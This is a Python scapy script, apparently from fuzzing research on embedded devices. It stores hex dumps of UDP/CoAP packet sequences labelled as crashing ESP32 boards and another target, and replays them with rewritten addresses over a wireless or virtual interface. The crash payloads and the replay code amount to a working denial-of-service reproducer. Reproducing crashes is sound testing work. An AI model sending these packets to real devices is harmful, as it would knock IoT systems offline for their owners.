import scapy.all as scapy
import time
from binascii import unhexlify

# from packets 276467 to 276280 (have to be three packets interesting)
packet_lst_crash_esp32_6 = ["ecf1f8d5476becf1f8d5476b08004500004b33d740004011f1890a2f00010a2a00e8b95016330037f7284803af20f5b3801c609f98e0b94573707265737369661100d10208d18c10ff68686868686868686868686868686868",
                      "ecf1f8d5476becf1f8d5476b08004500004b370f40004011ee510a2f00010a2a00e8b95016330037e7214803af27f5b3801c609f98e0b94573707265737369661100d10218d1147aff68686868686868686868686868686868",
                      "ecf1f8d5476becf1f8d5476b08004500004b4c6040004011d9000a2f00010a2a00e8b9501633003749644803af501eb38039a774ff82b94573707265737369661100d10210d11410ff68686868686868686868686868686868"]

# from packet 257304 to 257141
packet_lst_crash_esp32_5 = ["ecf1f8d5476becf1f8d5476b08004500004bbd734000401167ed0a2f00010a2a00e8b95016330037419d48039b25f5b37249a6802a59b94573707265737369661100d10208d16010ff68686868686868686868686868686868",
                      "ecf1f8d5476becf1f8d5476b080045000044c701400040115e660a2f00010a2a00e8b95016330030ccc348036230f5b372537e8b705ab94573707265737369661100d10200d11410ff686868686868686868"]

# packets from 224101 to 223976
packet_lst_crash_esp32_4 = ["ecf1f8d5476becf1f8d5476b08004500004babfa4000401179660a2f00010a2a00e8b95016330037c44148037886f5b35ac49924ef34b94573707265737369661100d10208d13810ff68686868686868686868686868686868",
                      "ecf1f8d5476becf1f8d5476b080045000045af664000401176000a2f00010a2a00e8b95016330031047c48037c92f5b35ac0db695df2b94573707265737369661100d10250e21410ff68686868686868686868"]

# packets from 57646 to 57443 (have to be 4 packets interesting)
packet_lst_crash_esp32_3 = ["ecf1f8d5476becf1f8d5476b08004500004b27b440004011fdac0a2f00010a2a00e8b95016330037ef6b4803cab2f5b2e590f2288e0eb94573707265737369661100d10208d1bc10ff68686868686868686868686868686868",
                      "ecf1f8d5476becf1f8d5476b08004500004b311440004011f44c0a2f00010a2a00e8b950163300377a3c4803cac3d4b2e59997f63d56b94573707265737369661100d10228d11410ff68686868686868686868686868686868",
                      "ecf1f8d5476becf1f8d5476b08004500004b423440004011e32c0a2f00010a2a00e8b95016330037d4a848032ddff5b2e5af132b7783b94573707265737369661100d10218d11410ff68686868686868686868686868686868",
                      "ecf1f8d5476becf1f8d5476b08004500004b59af40004011cbb10a2f00010a2a00e8b950163300374f294803cb0cf5b2e5c2062f09bfb94573707265737369661100d10225d11410ff68686868686868686868686868686868"]

packet_lst_crash_esp32_2 = ["ecf1f8d5476becf1f8d5476b08004500004b287640004011fcea0a2f00010a2a00e896a416330037d63c4803a102eb11718eef9974ccb94573707265737369661100d10208d14410ff68686868686868686868686868686868",
                      "ecf1f8d5476becf1f8d5476b0800450000494c8540004011d8dd0a2f00010a2a00e896a416330035d9164803a143eb1171b6a7f82997b94573707265737369661100d10200d11410ff6868686868686868686868686868"]

packet_lst_crash_esp32_1 = [
                    # "ecf1f8d5476becf1f8d5476b08004500004bced240004011568e0a2f00010a2a00e896a4163300371af14803c01eeb1187a07109797ab94573707265737369661100d10208d11410ff68686868686868686868686868686868",
                    "ecf1f8d5476becf1f8d5476b08004500004bced240004011568e0a2f00010a2a00e896a4163300371af14803c01eeb1187a07109797ab94573707265737369661100d10208d15410ff68686868686868686868686868686868",
                    # "ecf1f8d5476becf1f8d5476b080045000047d836400040114d2e0a2f00010a2a00e896a416330033484c4803c02a591187a8deb9b733b94573707265737369661100d10200d11410ff686868686868686868686868",
                    "ecf1f8d5476becf1f8d5476b080045000047d836400040114d2e0a2f00010a2a00e896a416330033484c4803c02aeb1187a8deb9b733b94573707265737369661100d10200d11410ff686868686868686868686868"
]

packet_lst_crash_canpous_1 = ["ecf1f8d5476becf1f8d5476b080045000045f5b4400040115e640a2f00010a0dd2528ba1163300319a0a48ad44df91762c985da87d17c268656c6c6f9d0308451410ff68686868686868686868686868686868",
"ecf1f8d5476becf1f8d5476b080045000045f871400040115ba70a2f00010a0dd2528ba116330031cee2480244e191762c9acec2de2bb56261736963d10308d114c3ff68686868686868686868686868686868",
"ecf1f8d5476becf1f8d5476b08004500004ff8a0400040115b6e0a2f00010a0dd2528ba11633003ba9566d0244e291762c9b443b21c0b568656c6c6fff6868686868686868686868686868686868686868686868686868686868686868",
"ecf1f8d5476becf1f8d5476b08004500004ffb474000401158c70a2f00010a0dd2528ba11633003bd953580244e491762c9d9dbc9f48b56261736963ff3a68686868686868686868686868686868686868686868686868686868686868",
"ecf1f8d5476becf1f8d5476b080045000047fc7f4000401157970a2f00010a0dd2528ba116330033ebdc48b244e591762c9ea85ed689b562617369631100d10208d11410ff68686868686868686868686868686868",
"ecf1f8d5476becf1f8d5476b08004500004efe7140004011559e0a2f00010a0dd2528ba11633003a39d3580144e691762c9f777077edb56261736963c3000000ffc620474554203332392072657175657374207061796c6f61643a20",
"ecf1f8d5476becf1f8d5476b08004500004500504000401153c90a2f00010a0dd2528ba1163300318c9ade0244e891762ca1dfea0f3e9d6261736963d10308621410ff68686868686868686868686868686868",
"ecf1f8d5476becf1f8d5476b08004500004f019e4000401152710a2f00010a0dd2528ba11633003bf717ed0267ea91762ca382b19578b568656c6c6fff6868686868686868686868686868686868686868686868686868686868686868",
"ecf1f8d5476becf1f8d5476b08004500004502d24000401151470a2f00010a0dd2528ba116330031428e481044ec91762ca5de3153f07268656c6c6fd10308d11410ff68686868686868686868686868686868",
"ecf1f8d5476becf1f8d5476b08004500004e044b400040114fc50a2f00010a0dd2528ba11633003a5c8a2a0144ed91762ca65e84760cb568656c6c6f8f000000ff0a20474554203333362072657175657374207061796c6f61643a20",
"ecf1f8d5476becf1f8d5476b080045000047055e400040114eb90a2f00010a0dd2528ba116330033f1ba480344ef91762ca8e6458ba5b568656c6c6f1100d102d8af7e10ff68686868686868686868686868686868"]
def verify_lst(lst):
    count = 2
    for idx, pkt in enumerate(lst):
        # time.sleep(3)
        print("Packet: ", idx)
        while(count > 1):
            frame = scapy.Ether(unhexlify(pkt))
            frame[scapy.Ether].src ='00:d4:9e:83:48:d9'
            frame[scapy.Ether].dst = 'a8:03:2a:eb:f5:20'
            # pkt[IP].src = "10.42.0.100"
            
            del frame[scapy.IP].chksum
            del frame[scapy.UDP].chksum
            scapy.sendp(frame,iface = 'wlan0')
            time.sleep(0.5)
            count = count - 1
            print(count)
            # time.sleep(1)
        count = 2
    # manage to solve the sending packets to server issue   
def verify_lst_server(lst):
    count = 2
    for idx, pkt in enumerate(lst):
        # time.sleep(3)
        print("Packet: ", idx)
        while(count > 1):
            frame = scapy.Ether(unhexlify(pkt))
            frame[scapy.Ether].src ='ec:f1:f8:d5:47:6b'
            frame[scapy.Ether].dst = 'ec:f1:f8:d5:47:6b'
            # pkt[IP].src = "10.42.0.100"
            frame[scapy.IP].src = '10.47.0.1'
            # frame[scapy.IP]
            frame[scapy.IP].dst = '10.13.210.82'
            del frame[scapy.IP].chksum
            del frame[scapy.UDP].chksum
            scapy.sendp(frame,iface = 'veth5')
            time.sleep(0.5)
            count = count - 1
            print(count)
            # time.sleep(1)
        count = 2
def verify(idx):
    count = 10
    while(count>1): 
        frame = scapy.IP(unhexlify(packet_lst_232[idx]))
        scapy.send(frame,iface = "wlan0")
        count = count - 1
        print(count)

def send(pkt):
    count = 100
    while(count>1): 
        # frame = scapy.EthernetII
        frame = scapy.IP(unhexlify(pkt))
        # frame[scapy.IP].dst = '10.42.0.232'
        frame[scapy.IP].chksum = None
        x = frame[scapy.UDP]
        # seems like we need to manually set the chksum to null then update it 
        x[scapy.UDP].chksum = None
        # x.sport = 34599
        # x.dport = 5683
        d = scapy.IP(src='10.42.0.100', dst='10.47.0.1') / scapy.UDP(scapy.raw(x))
        # d = scapy.IP(src='10.42.0.100', dst='10.42.0.232') / scapy.UDP(scapy.raw(x))
        # frame = scapy.IP(frame)
        scapy.send(d)
        count = count - 1
        print(count)
def test_send(pkt):
    count = 10
    while(count>1): 
        frame = scapy.IP(unhexlify(pkt))
        scapy.send(frame,iface = "wlan0")
        count = count - 1
        print(count)
# print(len(paket_lst_156))

# while(count > 1):
#     # time.sleep(1)
#     for idx, pkt in enumerate(packet_lst_crash2):
#         frame = scapy.IP(unhexlify(pkt))
#         scapy.send(frame,iface = "wlan0")
#     count = count -1
#     print(count)


# test replicatble crashed packets to the board
count = 1
while(count>0):
    verify_lst_server(packet_lst_crash_canpous_1)
    count = count -1
# count = 1
# while(count>0):
#     verify_lst_server(packet_lst_crash3_verify)
#     count = count -1
